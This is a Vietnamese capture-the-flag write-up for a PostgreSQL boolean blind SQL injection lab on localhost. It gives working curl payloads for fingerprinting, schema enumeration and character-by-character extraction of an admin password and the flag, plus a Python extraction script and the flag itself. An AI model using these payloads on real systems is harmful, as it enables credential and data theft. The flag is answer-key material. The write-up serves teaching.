# SQLi-023: PostgreSQL Boolean Blind - Complete Writeup

## 📋 Tóm Tắt

**Kỹ thuật:** Boolean Blind với SUBSTRING character-by-character extraction  
**DBMS:** PostgreSQL  
**Flag:** `FLAG{b00l34n_bl1nd_substr1ng}`

---

## 🔍 Bước 1: DETECT - Tìm Điểm Chèn

### 1.1 Phát hiện Boolean Blind SQLi

```bash
# TRUE condition - "Username is taken"
curl "http://localhost:5023/check?username=john_doe' AND '1'='1"

# FALSE condition - "Username is available"  
curl "http://localhost:5023/check?username=john_doe' AND '1'='2"
```

→ Response khác nhau = **Boolean Blind SQLi confirmed!**

---

## 🎯 Bước 2: IDENTIFY - Xác Định Database

### Cách 1: PostgreSQL version function

```bash
# PostgreSQL có version() function
curl "http://localhost:5023/check?username=john_doe' AND (SELECT version()) LIKE 'PostgreSQL%'--"
# → "taken" = TRUE = PostgreSQL confirmed!
```

### Cách 2: PostgreSQL-specific casting

```bash
# PostgreSQL dùng :: cho type casting
curl "http://localhost:5023/check?username=john_doe' AND '1'::int=1--"
# → "taken" = TRUE = PostgreSQL!

# MySQL sẽ fail với syntax này
```

### Cách 3: Check pg_catalog schema

```bash
# PostgreSQL có pg_catalog schema
curl "http://localhost:5023/check?username=john_doe' AND (SELECT COUNT(*) FROM pg_catalog.pg_tables)>0--"
# → "taken" = TRUE = PostgreSQL!
```

**Lưu ý:** `||` operator KHÔNG đáng tin cậy vì MySQL 8.0+ cũng hỗ trợ trong một số mode.

---

## 🔢 Bước 3: ENUMERATE - Liệt Kê Cấu Trúc

### 3.1 Đếm số bảng trong database

```bash
# Đếm số bảng trong schema public
curl "http://localhost:5023/check?username=john_doe' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')>3--"
# → "taken" = TRUE, có hơn 3 bảng
```

### 3.2 Extract tên bảng thứ nhất

```bash
# Lấy độ dài tên bảng đầu tiên
curl "http://localhost:5023/check?username=john_doe' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0)=5--"
# → "taken" = TRUE, tên bảng có 5 ký tự

# Extract từng ký tự của tên bảng (ví dụ: "users")
curl "http://localhost:5023/check?username=john_doe' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0)='u'--"
# → "taken" = TRUE, ký tự đầu là 'u'

curl "http://localhost:5023/check?username=john_doe' AND (SELECT SUBSTR(table_name,2,1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0)='s'--"
# → "taken" = TRUE, ký tự thứ 2 là 's'

# Tiếp tục cho đến hết: users
```

### 3.3 Extract các bảng khác

```bash
# Bảng thứ 2 (OFFSET 1)
curl "http://localhost:5023/check?username=john_doe' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1)='a'--"
# → Extract: admin_secrets

# Bảng thứ 3 (OFFSET 2) - bảng flags
curl "http://localhost:5023/check?username=john_doe' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 2)='f'--"
# → Extract: flags
```

**Kết quả:** Tìm được 3 bảng: `users`, `admin_secrets`, `flags`

### 3.4 Enumerate columns của bảng flags

```bash
# Đếm số columns
curl "http://localhost:5023/check?username=john_doe' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='flags')=3--"
# → 3 columns

# Extract tên column đầu tiên (OFFSET 0)
curl "http://localhost:5023/check?username=john_doe' AND (SELECT SUBSTR(column_name,1,1) FROM information_schema.columns WHERE table_name='flags' LIMIT 1 OFFSET 0)='i'--"
# → Extract: id

# Column thứ 2 (OFFSET 1)
curl "http://localhost:5023/check?username=john_doe' AND (SELECT SUBSTR(column_name,1,1) FROM information_schema.columns WHERE table_name='flags' LIMIT 1 OFFSET 1)='n'--"
# → Extract: name

# Column thứ 3 (OFFSET 2)
curl "http://localhost:5023/check?username=john_doe' AND (SELECT SUBSTR(column_name,1,1) FROM information_schema.columns WHERE table_name='flags' LIMIT 1 OFFSET 2)='v'--"
# → Extract: value
```

**Kết quả:** Bảng `flags` có columns: `id`, `name`, `value`

### 3.5 Enumerate columns của bảng admin_secrets (tương tự)

```bash
# Extract tên column đầu tiên
curl "http://localhost:5023/check?username=john_doe' AND (SELECT SUBSTR(column_name,1,1) FROM information_schema.columns WHERE table_name='admin_secrets' LIMIT 1 OFFSET 0)='i'--"
# → Extract: id

# Column thứ 2
# → Extract: username

# Column thứ 3
# → Extract: password
```

**Kết quả:** Bảng `admin_secrets` có columns: `id`, `username`, `password`, `email`, `role`, `api_key`

### 3.6 Đếm số rows trong admin_secrets

```bash
curl "http://localhost:5023/check?username=john_doe' AND (SELECT COUNT(*) FROM admin_secrets)=2--"
# → "taken" = TRUE, có 2 admin users
```

### 3.6 Đếm độ dài password

```bash
# Password length > 10?
curl "http://localhost:5023/check?username=john_doe' AND (SELECT LENGTH(password) FROM admin_secrets LIMIT 1)>10--"
# → "taken" = TRUE

# Length > 20?  
curl "http://localhost:5023/check?username=john_doe' AND (SELECT LENGTH(password) FROM admin_secrets LIMIT 1)>20--"
# → "available" = FALSE

# Length = 19
```


---

## 📤 Bước 4: EXTRACT - Lấy Dữ Liệu

### 4.1 Extract password character-by-character

```bash
# Ký tự 1 = 'B'?
curl "http://localhost:5023/check?username=john_doe' AND (SELECT SUBSTR(password,1,1) FROM admin_secrets LIMIT 1)='B'--"
# → "taken" = TRUE!

# Ký tự 2 = 'l'?
curl "http://localhost:5023/check?username=john_doe' AND (SELECT SUBSTR(password,2,1) FROM admin_secrets LIMIT 1)='l'--"
# → "taken" = TRUE!
```

### 4.2 Binary Search với ASCII (faster)

```bash
# ASCII của ký tự 1 > 64 (A)?
curl "http://localhost:5023/check?username=john_doe' AND ASCII((SELECT SUBSTR(password,1,1) FROM admin_secrets LIMIT 1))>64--"
# Tiếp tục binary search...
```

**Password extracted:** `Bl1nd_Sup3r_S3cr3t!`

---

## ⬆️ Bước 5: ESCALATE - Leo Thang

```bash
# Extract username
curl "http://localhost:5023/check?username=john_doe' AND (SELECT SUBSTR(username,1,1) FROM admin_secrets LIMIT 1)='s'--"
# → superadmin:Bl1nd_Sup3r_S3cr3t!
```

---

## 🏆 Bước 6: EXFILTRATE - Trích Xuất Flag

### Extract flag value từ bảng flags

```bash
# Length of flag
curl "http://localhost:5023/check?username=john_doe' AND (SELECT LENGTH(value) FROM flags LIMIT 1)=29--"
# → 29 characters

# Extract character by character
curl "http://localhost:5023/check?username=john_doe' AND (SELECT SUBSTR(value,1,1) FROM flags LIMIT 1)='F'--"
# → "taken" = TRUE!

curl "http://localhost:5023/check?username=john_doe' AND (SELECT SUBSTR(value,2,1) FROM flags LIMIT 1)='L'--"
# → "taken" = TRUE!

# ... continue for all 29 characters
```

🎉 **FLAG:** `FLAG{b00l34n_bl1nd_substr1ng}`

---

## 📝 Exploit Script Snippet

```python
import requests

def check(payload):
    url = f"http://localhost:5023/check?username={payload}"
    r = requests.get(url)
    return "is taken" in r.text

# Extract flag
flag = ""
for pos in range(1, 30):
    for c in "FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz":
        payload = f"john_doe' AND (SELECT SUBSTR(value,{pos},1) FROM flags LIMIT 1)='{c}'--"
        if check(payload):
            flag += c
            print(f"[+] {flag}")
            break
```

---

## ✅ Flag

```
FLAG{b00l34n_bl1nd_substr1ng}
```
